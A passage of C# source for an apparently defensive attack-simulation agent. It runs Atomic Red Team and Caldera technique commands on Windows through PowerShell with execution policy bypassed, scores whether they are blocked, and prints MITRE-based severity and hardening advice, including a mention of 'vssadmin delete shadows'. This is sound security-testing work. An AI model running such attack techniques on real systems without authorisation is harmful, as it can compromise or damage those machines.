                            if (!string.IsNullOrWhiteSpace(stderr))  rawOut += (rawOut.Length > 0 ? " | " : "") + stderr.Trim();
                            // ART convention: exit 0 means the test RAN (not blocked) => security gap => Fail
                            result = exitCode == 0 ? CheckResult.Fail : CheckResult.Pass;
                            if (result == CheckResult.Fail) failCount++; else passCount++;
                            Console.WriteLine($"[ART]       → {(result == CheckResult.Fail ? "✗ FAIL (ran undetected)" : "✓ PASS (blocked)")} exit={exitCode}");
                            detail     = FrameworkDetails(result, capturedTechId, capturedTechDisplay, test.Description, capturedTactic, rawOut);
                            remediation = FrameworkRemediation(result, capturedTactic, capturedTechId, capturedTechDisplay);
                            try { File.Delete(scriptPath); } catch { }
                        }
                        else if (capturedExecutor.Equals("command_prompt", StringComparison.OrdinalIgnoreCase) ||
                                 capturedExecutor.Equals("cmd", StringComparison.OrdinalIgnoreCase))
                        {
                            string batPath = Path.Combine(Path.GetTempPath(), $"bas_art_{Guid.NewGuid():N}.bat");
                            await File.WriteAllTextAsync(batPath, "@echo off\r\n" + capturedCmd);
                            var psi = new ProcessStartInfo("cmd.exe", $"/c \"{batPath}\"")
                            {
                                RedirectStandardOutput = true,
                                RedirectStandardError  = true,
                                UseShellExecute        = false,
                                CreateNoWindow         = true
                            };
                            using var proc = Process.Start(psi)!;
                            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
                            var stderrTask = proc.StandardError.ReadToEndAsync();
                            await WaitOrKillAsync(proc, 10_000);
                            string stdout  = await stdoutTask;
                            string stderr  = await stderrTask;
                            int exitCode   = proc.HasExited ? proc.ExitCode : -1;
                            string rawOut  = "";
                            if (!string.IsNullOrWhiteSpace(stdout)) rawOut += stdout.Trim();
                            if (!string.IsNullOrWhiteSpace(stderr))  rawOut += (rawOut.Length > 0 ? " | " : "") + stderr.Trim();
                            result = exitCode == 0 ? CheckResult.Fail : CheckResult.Pass;
                            if (result == CheckResult.Fail) failCount++; else passCount++;
                            Console.WriteLine($"[ART]       → {(result == CheckResult.Fail ? "✗ FAIL (ran undetected)" : "✓ PASS (blocked)")} exit={exitCode}");
                            detail      = FrameworkDetails(result, capturedTechId, capturedTechDisplay, test.Description, capturedTactic, rawOut);
                            remediation = FrameworkRemediation(result, capturedTactic, capturedTechId, capturedTechDisplay);
                            try { File.Delete(batPath); } catch { }
                        }
                        else
                        {
                            result = CheckResult.Skipped;
                            skipCount++;
                            Console.WriteLine($"[ART]       → ○ SKIP (unsupported executor: {capturedExecutor})");
                            detail = $"Executor '{capturedExecutor}' is not supported on Windows by this agent.";
                        }

                        // Always attempt cleanup to keep the system clean
                        if (!string.IsNullOrWhiteSpace(capturedCleanup))
                        {
                            try
                            {
                                string cleanupPath = Path.Combine(Path.GetTempPath(), $"bas_art_cleanup_{Guid.NewGuid():N}.ps1");
                                await File.WriteAllTextAsync(cleanupPath, capturedCleanup);
                                var cleanupPsi = new ProcessStartInfo("powershell.exe",
                                    $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{cleanupPath}\"")
                                {
                                    RedirectStandardOutput = true, RedirectStandardError = true,
                                    UseShellExecute = false,       CreateNoWindow = true
                                };
                                using var cleanupProc = Process.Start(cleanupPsi)!;
                                await WaitOrKillAsync(cleanupProc, 15_000);
                                try { File.Delete(cleanupPath); } catch { }
                            }
                            catch { /* best-effort cleanup — non-fatal */ }
                        }
                    }
                    catch (Exception ex)
                    {
                        result     = CheckResult.Skipped;
                        skipCount++;
                        Console.WriteLine($"[ART]       → ○ SKIP (exception: {ex.Message})");
                        detail     = $"Unhandled exception: {ex.Message}";
                        remediation = "Review agent logs for details.";
                    }

                    return (result, detail, remediation);
                })) with
                {
                    Severity     = FrameworkSeverity(capturedTactic),
                    ThreatImpact = FrameworkThreatImpact(capturedTactic, capturedTechId, capturedTechDisplay)
                });
                await flush();
            }
        }

        Console.WriteLine($"[ART] ════════════════════════════════════════════════════════");
        Console.WriteLine($"[ART] Atomic Red Team — COMPLETE");
        Console.WriteLine($"[ART]   Total tests executed: {globalTestIndex}");
        Console.WriteLine($"[ART]   ✓ PASS  (blocked):    {passCount}");
        Console.WriteLine($"[ART]   ✗ FAIL  (undetected): {failCount}");
        Console.WriteLine($"[ART]   ○ SKIP  (skipped):    {skipCount}");
        Console.WriteLine($"[ART] ════════════════════════════════════════════════════════");

        if (!cat.Checks.Any())
        {
            cat.Checks.Add(new SimCheck
            {
                Name        = "ART – No Windows tests found",
                TechniqueId = "N/A",
                Result      = CheckResult.Skipped,
                Severity    = "Info",
                Details     = "No Windows-compatible atomic tests found in the atomics directory.",
                Remediation = "Ensure the full Atomic Red Team atomics folder is present next to the agent EXE."
            });
            await flush();
        }

    }
}

// ============================================================
// ATOMIC RED TEAM YAML MODELS
// Mirrors the structure of ART .yaml definition files.
// ============================================================
class ArtTechnique
{
    public string? AttackTechnique { get; set; }
    public string? DisplayName     { get; set; }
    public List<ArtAtomicTest>? AtomicTests { get; set; }

    // Populated post-load from folder path; not in the YAML itself.
    [YamlDotNet.Serialization.YamlIgnore]
    public string? Tactic { get; set; }
}

// Maps MITRE ATT&CK technique ID prefix → tactic name.
// Covers all top-level and most common sub-techniques.
static class MitreTacticMap
{
    static readonly Dictionary<string, string> _map = new(StringComparer.OrdinalIgnoreCase)
    {
        // Initial Access
        ["T1078"] = "initial-access", ["T1190"] = "initial-access", ["T1133"] = "initial-access",
        ["T1566"] = "initial-access", ["T1091"] = "initial-access", ["T1195"] = "initial-access",
        // Execution
        ["T1059"] = "execution", ["T1106"] = "execution", ["T1129"] = "execution",
        ["T1204"] = "execution", ["T1569"] = "execution", ["T1203"] = "execution",
        ["T1053"] = "execution", ["T1072"] = "execution",
        // Persistence
        ["T1098"] = "persistence", ["T1136"] = "persistence", ["T1197"] = "persistence",
        ["T1547"] = "persistence", ["T1037"] = "persistence", ["T1176"] = "persistence",
        ["T1554"] = "persistence", ["T1543"] = "persistence", ["T1546"] = "persistence",
        ["T1133"] = "persistence", ["T1137"] = "persistence", ["T1542"] = "persistence",
        ["T1505"] = "persistence", ["T1525"] = "persistence", ["T1556"] = "persistence",
        // Privilege Escalation
        ["T1134"] = "privilege-escalation", ["T1068"] = "privilege-escalation",
        ["T1484"] = "privilege-escalation", ["T1611"] = "privilege-escalation",
        ["T1548"] = "privilege-escalation",
        // Defense Evasion
        ["T1140"] = "defense-evasion", ["T1480"] = "defense-evasion", ["T1211"] = "defense-evasion",
        ["T1222"] = "defense-evasion", ["T1564"] = "defense-evasion", ["T1574"] = "defense-evasion",
        ["T1562"] = "defense-evasion", ["T1036"] = "defense-evasion", ["T1112"] = "defense-evasion",
        ["T1556"] = "defense-evasion", ["T1578"] = "defense-evasion", ["T1055"] = "defense-evasion",
        ["T1207"] = "defense-evasion", ["T1014"] = "defense-evasion", ["T1218"] = "defense-evasion",
        ["T1216"] = "defense-evasion", ["T1553"] = "defense-evasion", ["T1221"] = "defense-evasion",
        ["T1127"] = "defense-evasion", ["T1535"] = "defense-evasion", ["T1550"] = "defense-evasion",
        ["T1078"] = "defense-evasion", ["T1497"] = "defense-evasion",
        // Credential Access
        ["T1110"] = "credential-access", ["T1555"] = "credential-access", ["T1212"] = "credential-access",
        ["T1187"] = "credential-access", ["T1606"] = "credential-access", ["T1056"] = "credential-access",
        ["T1557"] = "credential-access", ["T1111"] = "credential-access", ["T1621"] = "credential-access",
        ["T1040"] = "credential-access", ["T1003"] = "credential-access", ["T1528"] = "credential-access",
        ["T1649"] = "credential-access", ["T1558"] = "credential-access", ["T1539"] = "credential-access",
        // Discovery
        ["T1087"] = "discovery", ["T1010"] = "discovery", ["T1217"] = "discovery",
        ["T1580"] = "discovery", ["T1538"] = "discovery", ["T1526"] = "discovery",
        ["T1619"] = "discovery", ["T1613"] = "discovery", ["T1622"] = "discovery",
        ["T1482"] = "discovery", ["T1083"] = "discovery", ["T1046"] = "discovery",
        ["T1135"] = "discovery", ["T1040"] = "discovery", ["T1201"] = "discovery",
        ["T1120"] = "discovery", ["T1069"] = "discovery", ["T1057"] = "discovery",
        ["T1012"] = "discovery", ["T1018"] = "discovery", ["T1518"] = "discovery",
        ["T1082"] = "discovery", ["T1614"] = "discovery", ["T1016"] = "discovery",
        ["T1049"] = "discovery", ["T1033"] = "discovery", ["T1007"] = "discovery",
        ["T1124"] = "discovery", ["T1497"] = "discovery",
        // Lateral Movement
        ["T1210"] = "lateral-movement", ["T1534"] = "lateral-movement", ["T1570"] = "lateral-movement",
        ["T1563"] = "lateral-movement", ["T1021"] = "lateral-movement", ["T1091"] = "lateral-movement",
        ["T1072"] = "lateral-movement", ["T1080"] = "lateral-movement", ["T1550"] = "lateral-movement",
        // Collection
        ["T1560"] = "collection", ["T1123"] = "collection", ["T1119"] = "collection",
        ["T1115"] = "collection", ["T1530"] = "collection", ["T1213"] = "collection",
        ["T1005"] = "collection", ["T1039"] = "collection", ["T1025"] = "collection",
        ["T1074"] = "collection", ["T1114"] = "collection", ["T1185"] = "collection",
        ["T1557"] = "collection", ["T1113"] = "collection", ["T1125"] = "collection",
        // Command and Control
        ["T1071"] = "command-and-control", ["T1092"] = "command-and-control",
        ["T1132"] = "command-and-control", ["T1001"] = "command-and-control",
        ["T1568"] = "command-and-control", ["T1573"] = "command-and-control",
        ["T1008"] = "command-and-control", ["T1105"] = "command-and-control",
        ["T1104"] = "command-and-control", ["T1095"] = "command-and-control",
        ["T1572"] = "command-and-control", ["T1090"] = "command-and-control",
        ["T1219"] = "command-and-control", ["T1205"] = "command-and-control",
        ["T1102"] = "command-and-control",
        // Exfiltration
        ["T1020"] = "exfiltration", ["T1030"] = "exfiltration", ["T1048"] = "exfiltration",
        ["T1041"] = "exfiltration", ["T1011"] = "exfiltration", ["T1052"] = "exfiltration",
        ["T1567"] = "exfiltration", ["T1029"] = "exfiltration", ["T1537"] = "exfiltration",
        // Impact
        ["T1531"] = "impact", ["T1485"] = "impact", ["T1486"] = "impact",
        ["T1565"] = "impact", ["T1491"] = "impact", ["T1561"] = "impact",
        ["T1499"] = "impact", ["T1495"] = "impact", ["T1490"] = "impact",
        ["T1498"] = "impact", ["T1496"] = "impact", ["T1489"] = "impact",
        ["T1529"] = "impact",
    };

    public static string Lookup(string? techId)
    {
        if (string.IsNullOrWhiteSpace(techId)) return "";
        // Normalise sub-technique T1059.001 → T1059 for lookup
        string baseId = techId.Contains('.') ? techId[..techId.IndexOf('.')] : techId;
        return _map.TryGetValue(baseId, out var tactic) ? tactic : "";
    }
}

class ArtAtomicTest
{
    public string             Name               { get; set; } = "";
    public string?            AutoGeneratedGuid  { get; set; }
    public string?            Description        { get; set; }
    public List<string>?      SupportedPlatforms { get; set; }
    public string?            DependencyExecutorName { get; set; }
    public List<ArtDependency>? Dependencies       { get; set; }
    public Dictionary<string, ArtInputArgument?>? InputArguments { get; set; }
    public ArtExecutor?       Executor           { get; set; }
}

class ArtDependency
{
    public string? Description       { get; set; }
    public string? PrereqCommand     { get; set; }
    public string? GetPrereqCommand  { get; set; }
}

class ArtInputArgument
{
    public string?  Description { get; set; }
    public string?  Type        { get; set; }
    public object?  Default     { get; set; }
}

class ArtExecutor
{
    public string  Name             { get; set; } = "";
    public string? Command          { get; set; }
    public string? CleanupCommand   { get; set; }
    public bool    ElevationRequired { get; set; }
}

// ============================================================
// CALDERA YAML MODELS
// ============================================================
class CalderaAbility
{
    public string?              Id          { get; set; }
    public string?              Name        { get; set; }
    public string?              Description { get; set; }
    public string?              Tactic      { get; set; }
    public CalderaTechnique?    Technique   { get; set; }
    // Modern Stockpile format: platforms.windows.psh.command
    public Dictionary<string, Dictionary<string, CalderaPlatformExecutor>>? Platforms { get; set; }
    // Old Caldera format (kept for compatibility)
    public List<CalderaExecutor>? Executors { get; set; }
}
class CalderaTechnique
{
    public string? AttackId { get; set; }
    public string? Name     { get; set; }
}
// Modern Stockpile executor (nested under platforms.os.executor_type)
class CalderaPlatformExecutor
{
    public string? Command  { get; set; }
    public string? Cleanup  { get; set; }
}
// Old-format executor (list under executors:)
class CalderaExecutor
{
    public string? Name     { get; set; }
    public string? Platform { get; set; }
    public string? Command  { get; set; }
    public string? Cleanup  { get; set; }
}

// ============================================================
// PRELUDE YAML MODELS
// ============================================================
class PreludeTtp
{
    public string? Id          { get; set; }
    public string? Name        { get; set; }
    public string? Description { get; set; }
    // metadata.ATT&CK has a special key — read as generic dict
    public Dictionary<string, object>? Metadata { get; set; }
    // platforms.windows.psh / platforms.windows.cmd
    public Dictionary<string, Dictionary<string, PreludeExec>>? Platforms { get; set; }
}
class PreludeExec
{
    public string? Command { get; set; }
    public string? Cleanup { get; set; }
}

// ============================================================
// SIGMA YAML MODELS
// ============================================================
class SigmaRule
{
    public string?         Title      { get; set; }
    public string?         Id         { get; set; }
    public string?         Status     { get; set; }
    public string?         Description{ get; set; }
    public List<string>?   Tags       { get; set; }
    public SigmaLogSource? Logsource  { get; set; }
    public string?         Level      { get; set; }
}
class SigmaLogSource
{
    public string? Product  { get; set; }
    public string? Service  { get; set; }
    public string? Category { get; set; }
}

// ============================================================
// SHARED FRAMEWORK EXECUTION HELPER
// Same convention as ART: exit 0 = ran undetected (Fail),
// non-zero = blocked/prevented (Pass).
// ============================================================
static partial class Program
{
    static async Task<(CheckResult result, string detail)> RunFrameworkCmd(
        string executor, string command, string logPrefix)
    {
        bool isPsh = executor is "psh" or "powershell";
        string ext  = isPsh ? "ps1" : "bat";
        string tmp  = Path.Combine(Path.GetTempPath(), $"bas_{logPrefix}_{Guid.NewGuid():N}.{ext}");
        try
        {
            string content = isPsh ? command : "@echo off\r\n" + command;
            await File.WriteAllTextAsync(tmp, content);

            ProcessStartInfo psi = isPsh
                ? new("powershell.exe", $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{tmp}\"")
                : new("cmd.exe", $"/c \"{tmp}\"");
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError  = true;
            psi.UseShellExecute        = false;
            psi.CreateNoWindow         = true;

            using var proc = Process.Start(psi)!;
            var outTask = proc.StandardOutput.ReadToEndAsync();
            var errTask = proc.StandardError.ReadToEndAsync();
            await WaitOrKillAsync(proc, 10_000);
            string stdout = await outTask;
            string stderr = await errTask;
            int    exit   = proc.HasExited ? proc.ExitCode : -1;

            string detail = $"Exit:{exit}";
            if (!string.IsNullOrWhiteSpace(stdout))
                detail += $" | {stdout.Trim()[..Math.Min(250, stdout.Trim().Length)]}";
            if (!string.IsNullOrWhiteSpace(stderr))
                detail += $" | ERR:{stderr.Trim()[..Math.Min(150, stderr.Trim().Length)]}";

            return (exit == 0 ? CheckResult.Fail : CheckResult.Pass, detail);
        }
        catch (Exception ex) { return (CheckResult.Fail, $"Exception: {ex.Message}"); }
        finally { try { File.Delete(tmp); } catch { } }
    }

    // ──────────────────────────────────────────────────────────────
    // FRAMEWORK CHECK METADATA HELPERS
    // Used by ALL framework simulations (ART, Caldera, Prelude, Sigma,
    // Stratus, InfectionMonkey, Invoke-ART, and any future additions).
    //
    // Pattern for every new framework Sim_Xxx method:
    //   string tactic = MitreTacticMap.Lookup(techId);         // derive tactic
    //   check.Severity     = FrameworkSeverity(tactic);        // Critical/High/Medium
    //   check.ThreatImpact = FrameworkThreatImpact(tactic, techId, techName);
    //   // For executed checks (Pass/Fail):
    //   string detail = FrameworkDetails(result, techId, techName, desc, tactic, rawOut);
    //   string rem    = FrameworkRemediation(result, tactic, techId, techName);
    //   // For skipped/informational checks set Details and Remediation manually.
    // ──────────────────────────────────────────────────────────────

    static string FrameworkSeverity(string? tactic) => (tactic ?? "").ToLowerInvariant() switch
    {
        "credential-access" or "lateral-movement" or "privilege-escalation" => "Critical",
        "persistence"       or "defense-evasion"  or "execution"
                            or "command-and-control" or "impact"             => "High",
        "collection"        or "exfiltration"                                => "High",
        _                                                                    => "Medium"
    };

    static string FrameworkDetails(CheckResult result, string techId, string? techName,
        string? description, string? tactic, string rawOutput)
    {
        string tacticLabel = string.IsNullOrWhiteSpace(tactic) ? "" : $" | Tactic: {tactic}";
        string descPart    = string.IsNullOrWhiteSpace(description) ? "" : $" | {description.Trim()[..Math.Min(200, description.Trim().Length)]}";
        string outPart     = string.IsNullOrWhiteSpace(rawOutput)   ? "" :
            $" | Output: {rawOutput.Trim().Replace("\r\n", " ").Replace("\n", " ")[..Math.Min(150, rawOutput.Trim().Length)]}";

        return result == CheckResult.Fail
            ? $"{techId} ({techName}) executed undetected{tacticLabel}.{descPart}{outPart}"
            : $"{techId} ({techName}) was blocked by security controls{tacticLabel}.{outPart}";
    }

    static string FrameworkThreatImpact(string? tactic, string techId, string? techName)
    {
        string tech = $"{techId}{(string.IsNullOrWhiteSpace(techName) ? "" : " – " + techName)}";
        return (tactic ?? "").ToLowerInvariant() switch
        {
            "credential-access"     => $"{tech}: Harvested credentials let attackers authenticate as legitimate users, move laterally, and access sensitive data without triggering behavioural alerts. Credential theft is the #1 vector in ransomware incidents.",
            "lateral-movement"      => $"{tech}: Lateral movement spreads a single compromised endpoint into domain controllers, file servers, and backup systems — enabling mass ransomware deployment or data exfiltration.",
            "privilege-escalation"  => $"{tech}: Privilege escalation converts a standard-user compromise into full system or domain control, allowing attackers to disable security tools, dump credentials, and deploy persistent backdoors.",
            "persistence"           => $"{tech}: Persistent access survives reboots and credential rotations. Attackers use persistence to maintain long-term footholds for data theft staging and ransomware pre-positioning.",
            "defense-evasion"       => $"{tech}: Evasion techniques let attackers operate undetected for weeks. Mandiant M-Trends reports an average dwell time of 21 days — enough time to exfiltrate terabytes before discovery.",
            "execution"             => $"{tech}: Unrestricted code execution is the foundation of every attack chain. Without execution controls, any payload — keylogger, RAT, or ransomware — can run without an alert.",
            "discovery"             => $"{tech}: Discovery lets attackers map the environment before striking — identifying admin accounts, high-value targets, and security gaps. Pre-attack recon dramatically increases attack precision.",
            "collection"            => $"{tech}: Data collection precedes exfiltration. Undetected staging allows attackers to exfiltrate terabytes before any alert fires.",
            "exfiltration"          => $"{tech}: Successful exfiltration triggers regulatory penalties, breach notifications, and reputational damage. IBM 2023 puts average breach cost at $4.45M.",
            "command-and-control"   => $"{tech}: An active C2 channel gives attackers real-time remote control — enabling data theft, lateral movement, and ransomware deployment from outside the perimeter.",
            "impact"                => $"{tech}: Destructive and ransomware attacks cause average downtime of 24 days and recovery costs exceeding $1M (Sophos State of Ransomware 2023).",
            _                       => $"{tech}: If this technique executes undetected, a real attacker using the same method can operate freely on this endpoint without triggering any security alert."
        };
    }

    static string FrameworkRemediation(CheckResult result, string? tactic, string techId, string? techName)
    {
        if (result != CheckResult.Fail)
            return $"{techId} was blocked — existing controls are effective for this technique. Continue monitoring.";

        string tech = techName ?? techId;
        return (tactic ?? "").ToLowerInvariant() switch
        {
            "credential-access" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Enable Credential Guard: Group Policy → Device Guard → Turn On Virtualization Based Security → Credential Guard.\n" +
                "2) Enable LSA Protection: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa → RunAsPPL = 1.\n" +
                "3) Enable ASR rule 'Block credential stealing from the LSASS process' in Microsoft Defender.\n" +
                "4) Enforce MFA on all privileged accounts to limit the blast radius of stolen credentials.",

            "lateral-movement" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Enable SMB signing on all domain systems via GPO (Microsoft network server: Digitally sign communications).\n" +
                "2) Restrict NTLM via GPO: Network Security → Restrict NTLM → Outgoing NTLM traffic to remote servers.\n" +
                "3) Deploy Privileged Access Workstations (PAWs) — no direct admin access from user workstations to servers.\n" +
                "4) Enable Microsoft Defender for Identity to detect pass-the-hash and lateral movement patterns.",

            "privilege-escalation" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Apply least-privilege principles — remove SeDebugPrivilege and SeImpersonatePrivilege from non-admin accounts.\n" +
                "2) Enable UAC at maximum level (Always notify) and configure Secure Desktop.\n" +
                "3) Patch promptly — most local privilege escalation exploits target known CVEs fixed within 30 days of disclosure.\n" +
                "4) Deploy EDR with privilege escalation detection (CrowdStrike, Defender for Endpoint).",

            "persistence" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Enable and monitor Windows Event ID 7045 (new service installed), 4698 (scheduled task created), 4720 (user account created).\n" +
                "2) Deploy File Integrity Monitoring (FIM) on Startup, Registry Run keys, and Services.\n" +
                "3) Restrict who can create scheduled tasks and services via GPO (User Rights Assignment).\n" +
                "4) Enable Attack Surface Reduction rule 'Block persistence through WMI event subscription'.",

            "defense-evasion" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Enable Tamper Protection in Microsoft Defender — prevents disabling of real-time protection.\n" +
                "2) Enable script-block logging and module logging for PowerShell (GPO → Windows PowerShell).\n" +
                "3) Deploy an EDR solution with memory-scanning and behavioural detection (not just signature-based AV).\n" +
                "4) Enable Windows Defender Attack Surface Reduction rules to block common evasion vectors.",

            "execution" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Deploy application control (Windows Defender Application Control or AppLocker) with an allowlist policy.\n" +
                "2) Enable PowerShell Constrained Language Mode via GPO for non-admin users.\n" +
                "3) Enable ASR rule 'Block execution of potentially obfuscated scripts'.\n" +
                "4) Restrict macro execution in Office documents (GPO: Block macros from running in Office files from the internet).",

            "discovery" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Enable and alert on Event IDs 4661/4662 (object access), 4799 (group membership enumerated).\n" +
                "2) Deploy Microsoft Defender for Identity or Sentinel to detect reconnaissance patterns.\n" +
                "3) Limit AD query permissions for standard user accounts.\n" +
                "4) Use honey accounts and honey tokens to detect credential and user enumeration.",

            "collection" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Deploy Data Loss Prevention (DLP) to detect staging of sensitive data.\n" +
                "2) Enable audit logging on sensitive file shares and directories.\n" +
                "3) Restrict clipboard access and screen capture for non-privileged sessions.\n" +
                "4) Monitor for large archive creation in user-accessible directories.",

            "exfiltration" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Implement egress filtering — allow only approved destinations and protocols at the perimeter firewall.\n" +
                "2) Deploy a Cloud Access Security Broker (CASB) to monitor data movement to cloud services.\n" +
                "3) Enable NetFlow/full packet capture on egress points and alert on large data volumes.\n" +
                "4) Use DLP solutions to detect sensitive data leaving the network.",

            "command-and-control" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Implement DNS sinkholing and threat-intel-based DNS filtering (e.g., Cisco Umbrella, Infoblox).\n" +
                "2) Enable TLS inspection at the web proxy to detect C2 over HTTPS.\n" +
                "3) Block direct outbound internet access from servers — route all traffic via authenticated proxy.\n" +
                "4) Enable Defender for Endpoint Network Protection to block known malicious domains and IPs.",

            "impact" =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Follow the 3-2-1 backup rule: 3 copies, 2 media types, 1 offsite/offline — test restores monthly.\n" +
                "2) Enable VSS shadow copy protection and restrict 'vssadmin delete shadows' via AppLocker.\n" +
                "3) Enable ASR rule 'Use advanced protection against ransomware'.\n" +
                "4) Deploy a tested Incident Response plan with defined RTO/RPO for ransomware scenarios.",

            _ =>
                $"Security controls did NOT block {tech}.\n" +
                "1) Review EDR and AV coverage for this technique and ensure real-time protection is active.\n" +
                "2) Enable relevant Windows audit policies and forward logs to a SIEM.\n" +
                "3) Apply MITRE ATT&CK mitigation guidance for " + techId + " at attack.mitre.org.\n" +
                "4) Re-run this simulation after applying controls to verify effectiveness."
        };
    }

    // Scans every *master* directory beside BASAgent.exe, samples file contents to confirm
    // framework identity, and returns the root folder of the first matching directory.
    // No hardcoded paths — the only contract is the folder name contains "master".
    // Directories that are known large repos and should only be scanned when explicitly targeted.
    // Any framework search that doesn't name-match one of these skips it entirely.
    static readonly HashSet<string> _heavyRepoDirNames = new(StringComparer.OrdinalIgnoreCase)
        { "caldera", "caldera-master", "caldera-develop" };

    static string? AutoDiscoverFramework(string label, string[] filePatterns,
        Func<string, bool> contentSignature)
    {
        var roots = new[] { AppContext.BaseDirectory, Directory.GetCurrentDirectory() }
                        .Distinct(StringComparer.OrdinalIgnoreCase);

        string labelLower = label.ToLowerInvariant();

        foreach (var searchRoot in roots)
        {
            string[] masterDirs;
            try { masterDirs = Directory.GetDirectories(searchRoot, "*master*", SearchOption.TopDirectoryOnly); }
            catch { continue; }

            // Sort: name-matching directories first so the right repo is found without scanning others
            var ordered = masterDirs
                .OrderByDescending(d => Path.GetFileName(d).ToLowerInvariant().Contains(labelLower))
                .ThenBy(d => d);

            foreach (var masterDir in ordered)
            {
                string dirName = Path.GetFileName(masterDir).ToLowerInvariant();

                // Skip known heavy repos unless this search is targeting them by name
                if (_heavyRepoDirNames.Any(h => dirName.Contains(h.ToLowerInvariant())) &&
                    !dirName.Contains(labelLower))
                    continue;

                foreach (var pattern in filePatterns)
                {
                    string[] files;
                    try { files = Directory.GetFiles(masterDir, pattern, SearchOption.AllDirectories); }
                    catch { continue; }

                    if (files.Length == 0) continue;

                    // Sample up to 20 files to confirm framework identity via content
                    foreach (var f in files.Take(20))
                    {
                        try
                        {
                            if (contentSignature(File.ReadAllText(f)))
                            {
                                Console.WriteLine($"[{label}] Auto-discovered: {masterDir} ({files.Length} {pattern} files)");
                                return masterDir;
                            }
                        }
                        catch { }
                    }
                }
            }
        }

        Console.WriteLine($"[{label}] No *master* folder with matching content found beside BASAgent.exe.");
        return null;
    }

    // ──────────────────────────────────────────────────────────────
    // 16. CALDERA ABILITIES
    // Place caldera-master/ or caldera-main/ next to BASAgent.exe.
    // Scans data/abilities/ and plugins/stockpile/data/abilities/.
    // ──────────────────────────────────────────────────────────────
    static async Task Sim_Caldera(SimulationCategory cat, Func<Task> flush)
    {
        cat.Name  = "16. MITRE Caldera Abilities";
        cat.Phase = "MITRE ATT&CK Full Coverage";

        // Resolve abilities path. Priority order:
        //   1. Direct structural probe — caldera-master layout:  <any *caldera* dir>\plugins\stockpile\data\abilities
        //   2. Direct structural probe — stockpile-master layout: <any *stockpile* dir>\data\abilities
        //   3. Generic content scan — AutoDiscoverFramework (samples ability YAMLs for tactic/attack_id fields)
        string? abilitiesPath = null;

        var searchRoots = new[] { AppContext.BaseDirectory, Directory.GetCurrentDirectory() }
                              .Distinct(StringComparer.OrdinalIgnoreCase);

        foreach (var sr in searchRoots)
        {
            if (abilitiesPath != null) break;
            foreach (var dir in Directory.GetDirectories(sr, "*", SearchOption.TopDirectoryOnly)
                                         .OrderBy(d => d))
            {
                var name = Path.GetFileName(dir).ToLowerInvariant();
                // caldera-master: abilities live at plugins/stockpile/data/abilities
                if (name.Contains("caldera"))
                {
                    var p = Path.Combine(dir, "plugins", "stockpile", "data", "abilities");
                    if (Directory.Exists(p)) { abilitiesPath = p; Console.WriteLine($"[Caldera] Direct probe matched: {p}"); break; }
                }
                // stockpile-master: abilities live at data/abilities
                if (name.Contains("stockpile"))
                {
                    var p = Path.Combine(dir, "data", "abilities");
                    if (Directory.Exists(p)) { abilitiesPath = p; Console.WriteLine($"[Caldera] Direct probe matched: {p}"); break; }
                }
            }
        }

        // Fallback: generic discovery (works for any layout where ability YAMLs contain tactic+attack_id)
        if (abilitiesPath == null)
        {
            string? abilitiesRoot = AutoDiscoverFramework("Caldera", new[] { "*.yml" },
                c => c.Contains("tactic:") && c.Contains("attack_id:"));
            if (abilitiesRoot != null)
            {
                var calderaPlugin = Path.Combine(abilitiesRoot, "plugins", "stockpile", "data", "abilities");
                var stockpileSub  = Path.Combine(abilitiesRoot, "data", "abilities");
                if      (Directory.Exists(calderaPlugin)) abilitiesPath = calderaPlugin;
                else if (Directory.Exists(stockpileSub))  abilitiesPath = stockpileSub;
                else                                       abilitiesPath = abilitiesRoot;
            }
        }

        if (abilitiesPath == null)
        {
            cat.Checks.Add(new SimCheck
            {
                Name        = "Caldera – no ability YAML files found",
                Result      = CheckResult.Skipped,
                Severity    = "Info",
                Details     = "No Caldera/Stockpile abilities folder found beside BASAgent.exe.",
                Remediation = "Place caldera-master or stockpile-master beside BASAgent.exe. " +
                              "Expected paths: caldera-master\\plugins\\stockpile\\data\\abilities or stockpile-master\\data\\abilities."
            });
            await flush();
            return;
        }

        Console.WriteLine($"[Caldera] Abilities path: {abilitiesPath}");
        var ds = new DeserializerBuilder().WithNamingConvention(UnderscoredNamingConvention.Instance)
                     .IgnoreUnmatchedProperties().Build();

        int ran = 0, skipped = 0;
        foreach (var yml in Directory.GetFiles(abilitiesPath, "*.yml", SearchOption.AllDirectories).OrderBy(f => f))
        {
            List<CalderaAbility>? abilities = null;
            try { abilities = ds.Deserialize<List<CalderaAbility>>(await File.ReadAllTextAsync(yml)); }
            catch { skipped++; continue; }

            foreach (var ability in abilities ?? new())
            {
                // Resolve a Windows executor from either format:
                // Modern Stockpile: platforms.windows.psh/cmd
                // Old Caldera:      executors[].platform=windows, name=psh/cmd
                CalderaExecutor? exec = null;
                if (ability.Platforms != null &&
                    ability.Platforms.TryGetValue("windows", out var winPlatform))
                {
                    foreach (var execType in new[] { "psh", "cmd" })
                    {
                        if (winPlatform.TryGetValue(execType, out var pe) &&
                            !string.IsNullOrWhiteSpace(pe.Command))
                        {
                            exec = new CalderaExecutor { Name = execType, Platform = "windows",
                                                         Command = pe.Command, Cleanup = pe.Cleanup };
                            break;
                        }
                    }
                }
                else if (ability.Executors != null)
                {
                    exec = ability.Executors.FirstOrDefault(e =>
                        string.Equals(e.Platform, "windows", StringComparison.OrdinalIgnoreCase) &&
                        (string.Equals(e.Name, "psh", StringComparison.OrdinalIgnoreCase) ||
                         string.Equals(e.Name, "cmd", StringComparison.OrdinalIgnoreCase)));
                }

                if (exec == null || string.IsNullOrWhiteSpace(exec.Command)) { skipped++; continue; }

                string techId   = ability.Technique?.AttackId ?? "N/A";
                string testName = $"[Caldera] {techId} – {ability.Name}";
                string executor = exec.Name ?? "psh";
                string command  = exec.Command;
